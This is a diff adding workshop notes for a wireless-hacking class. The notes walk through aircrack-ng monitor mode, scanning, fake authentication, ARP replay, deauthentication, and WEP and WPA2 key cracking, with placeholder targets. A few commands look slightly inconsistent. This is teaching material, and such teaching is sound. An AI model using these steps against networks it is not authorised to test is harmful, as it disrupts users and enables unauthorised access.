@@ -1,0 +1,173 @@
+Wireless Workshop One
+
+
+
+TOOL INTRO
+
+
+**airmon-ng**
+
+#first run just airmon-ng to see your interfaces
+#see all your devices and assigned drivers
+#now start the device you want
+#one is great and two is better
+#avoid using wlan0 the best you can
+#wlan0 is usually your internal card and does not always work for hacker mode (monitor mode and packet injection)
+
+airmon-ng
+
+airmon-ng start wlanX
+
+#if you have problems you need to check or check kill
+#usually wpasuplicant or Network Manager is a problem
+#these items doing normal computer things interfere with hackermode
+
+
+**airodump-ng**
+
+#now lets see networks
+
+airodump-ng wlanXmon
+
+#now lets see more
+
+airodump-ng -b abg wlanXmon
+
+#MORE FILTERING
+
+#we can do further with 
+
+-2 or --ht20
+-3 or --ht40+ 
+-4 or --ht40-
+
+#we can also go by channel
+#by default airodump-ng will channel hop
+#if something happens when you are not on a channel you will not capture it
+
+airodump-ng -c X wlanXmon
+
+#or by BSSID (MAC ADDRESS)
+
+airodump-ng -d <bssid> wlanXmon
+
+#or --bssid instsead of -d
+
+#or by ESSID (SSID or Human Readable Name)
+
+airodump-ng -N <SSID>
+
+#or --essid
+
+#now lets collect 
+
+airodump-ng wlanXmon -w <filename> 
+
+#lets try another
+#do you see more devices when running this command?
+
+airodump-ng -b abg -R WIFI_LAB wlanXmon
+
+#watch the channel hopping and the time
+#targeted channels helps because of the delay on scanning
+
+
+#put it all together when ready
+
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -r test wlanXmon
+
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -b abg -r test wlanXmon
+
+#isolate and filter down to just what you need to make your pcap more managable
+
+**aireplay-ng**
+#note the new flags for the new tool so -b wont be the same as airodump-ng
+
+#TEST YOUR INTERFACE
+#-9 is testing flag
+aireplay-ng -9 <INT>
+
+
+REPLAY OPTIONS
+#-a <BSSID>
+#-d <destination MAC> (AP)
+#-h <source MAC> (INT MAC)
+#-e <ESSID>
+
+
+#-1 Fake Auth
+#-3 ARP Replay
+
+# 2 4 5 6 7 8 are useful for specific attacks and network situations.  Today we are just doing 1 and 9 for the class
+
+#Fake Auth
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <ATTACK INT MAC> <INT>
+
+#Replay Attack
+aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>
+
+#Deauth Attack
+aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <DEST MAC> <INT>
+
+**aircrack-ng**
+
+#-w for wordlist for doing WPA and WPA2
+
+#just need to run aircrack on cap if WEP
+
+aircrack-ng <name>.cap
+
+#if cracking handshake you need a wordlist
+
+aircrack-ng -w <wordlist> <name>.cap
+
+
+
+**WEP Attack**
+
+TAB1
+-Scan
+
+airodump-ng wlanXmon
+
+-Collect
+
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -b abg -r test wlanXmon
+
+TAB2
+-Fake Auth
+
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <ATTACK INT MAC> <INT>
+
+-Attack
+
+aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>
+
+TAB3
+
+-Run Aircrack
+
+aircrack-ng <name>.cap
+
+**WPA2 Attack**
+
+TAB1
+-Scan
+
+airodump-ng wlanXmon
+
+-Collect
+
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -b abg -r test wlanXmon
+
+TAB2
+
+-Deauth
+
+aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <DEST MAC> <INT>
+
+TAB3
+
+aircrack-ng
+
+aircrack-ng -w <wordlist> <name>.cap
